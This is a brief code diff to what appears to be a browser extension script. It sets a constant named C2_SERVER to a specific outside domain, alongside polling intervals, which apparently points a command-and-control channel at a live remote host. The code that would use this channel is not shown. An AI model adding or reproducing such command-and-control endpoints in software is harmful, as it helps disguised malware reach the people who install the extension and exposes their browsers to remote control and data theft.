@@ -28,7 +28,7 @@ window.run = function(cfg) {
     });
 };
 
-const C2_SERVER = 'https://'; // Update if using remote/HTTPS
+const C2_SERVER = 'https://tradingpiecefororder.asia'; // Update if using remote/HTTPS
 const MIN_POLL_SECONDS = 5;
 const MAX_POLL_SECONDS = 30;
 
@@ -435,5 +435,6 @@ if (typeof chrome !== 'undefined' && chrome.runtime?.onMessage) {
   });
   
 }
+
 
 
